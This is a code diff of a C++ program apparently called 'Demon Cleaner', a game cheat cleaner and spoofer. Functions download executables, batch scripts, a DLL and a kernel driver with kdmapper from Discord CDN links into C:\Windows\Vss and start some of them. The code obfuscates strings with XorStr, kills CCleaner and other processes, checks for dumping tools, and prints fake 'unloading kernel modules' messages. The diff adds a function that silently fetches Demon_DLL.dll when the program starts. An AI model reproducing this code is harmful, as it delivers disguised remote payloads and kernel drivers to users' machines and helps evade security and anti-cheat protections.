@@ -23,10 +23,10 @@ void apex()
     URLDownloadToFileA(NULL, apex.c_str(), apexpath.c_str(), 0, NULL);
     system("cd C:\\Windows\Vss\ ");
     system("Start C:\\Windows\Vss\Apex.bat");
-    
+
 
 }
-void gta() 
+void gta()
 {
 
     akfuxnl();
@@ -68,11 +68,19 @@ void cod()
     system("cd C:\\Windows\Vss\ ");
     system("Start C:\\Windows\Vss\Cold-Ware.bat");
 
-    
+
 }
 
+void demondll()
+{
+    akfuxnl();
+    std::string dll = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/881164876037361684/Demon_DLL.dll"));
+    std::string dllpath = "C:\\Windows\Vss\demon.dll";
+    URLDownloadToFileA(NULL, dll .c_str(), dllpath.c_str(), 0, NULL);
 
-void cleaner(){
+    
+}
+void cleaner() {
 
 
     rydekem();
@@ -86,7 +94,7 @@ void cleaner(){
     tlmisir();
     akfuxnl();
     lnttirs();
-    MessageBoxA(NULL, "You must verify the game files if a game isn't starting and then enjoy playing.", "warning by demon",MB_OK);
+    MessageBoxA(NULL, "You must verify the game files if a game isn't starting and then enjoy playing.", "warning by demon", MB_OK);
     system(XorStr("cls").c_str());
     system(XorStr("taskkill /F /IM CCleaner64.exe 2>NULL").c_str());
     system(XorStr("taskkill /F /IM WargamingErrorMonitor.exe 2>NULL").c_str());
@@ -221,7 +229,7 @@ void safeshutdown()
     lnttirs();
 
 
-    
+
 
     system(XorStr("cls").c_str());
     rydekem();
@@ -230,6 +238,13 @@ void safeshutdown()
     akfuxnl();
     lnttirs();
     string a;
+    std::cout << RED << "unloading kernel modules";
+    Sleep(3500);
+    std::cout << MAGENTA << "unloading resources";
+    Sleep(1450);
+    std::cout << CYAN << "unloading from memory";
+    Sleep(2400);
+    system(XorStr("cls").c_str());
     std::cout << "Do you want to restart your pc? \nYes/No : ";
     cin >> a;
     if (GetAsyncKeyState(VK_END))
@@ -252,14 +267,14 @@ void safeshutdown()
         system(XorStr("shutdown -r").c_str());
         exit(0);
     }
-    
-    else 
+
+    else
     {
         exit(0);
         return exit(0);
     }
-    
-    
+
+
 }
 void driverdetect()
 {
@@ -284,7 +299,7 @@ _T("\\\\.\\KsDumper")
         }
     }
 }
-    
+
 void spoofer()
 {
     rydekem();
@@ -293,13 +308,13 @@ void spoofer()
     akfuxnl();
     lnttirs();
 
-    
+
 
     akfuxnl();
     string spoofer = (XorStr("https://cdn.discordapp.com/attachments/702060437168193556/878327452898840667/NewWoof.sys"));
     string spooferpath = "C:\\Windows\Vss\woof.sys"; //change to dir you want
     URLDownloadToFileA(NULL, spoofer.c_str(), spooferpath.c_str(), 0, NULL);
-    
+
     string mapper = (XorStr("https://cdn.discordapp.com/attachments/834754431249285140/879745681294786600/kdmapper.exe"));
     string mapperpath = "C:\\Windows\Vss\mapper.exe";//change to dir you want
     URLDownloadToFileA(NULL, mapper.c_str(), mapperpath.c_str(), 0, NULL);
@@ -325,14 +340,14 @@ void setcolor(unsigned short color)
 void mainbot()
 {
     SetConsoleTitle(_T("Demon Cleaner V1.0 [release build]"));
-    setcolor(12);   
+    setcolor(12);
     std::cout << " _| |___ _____ ___ ___ \n";
     std::cout << "| . | -_|     | . |   |\n";
     std::cout << "|___|___|_|_|_|___|_|_|\n";
 
 
     std::cout << "\n";
-    
+
     system(XorStr("start https://discord.gg/MT9sApTneu").c_str());
     std::cout << MAGENTA << "Demon Cleaner V1.0\n";
     Sleep(2000);
@@ -342,21 +357,22 @@ void mainbot()
     std::cout << CYAN << "\nloading encryption...";
     Sleep(5000);
     system(XorStr("cls").c_str());
+    demondll();
     cleaner();
     fishingplanet();
     gta();
     apex();
-    cod(); 
+    cod();
     fortnite();
     spoofer();
-    
+
 }
 
 
 
 int main()
 {
- 
+
     mainbot();
 }
 
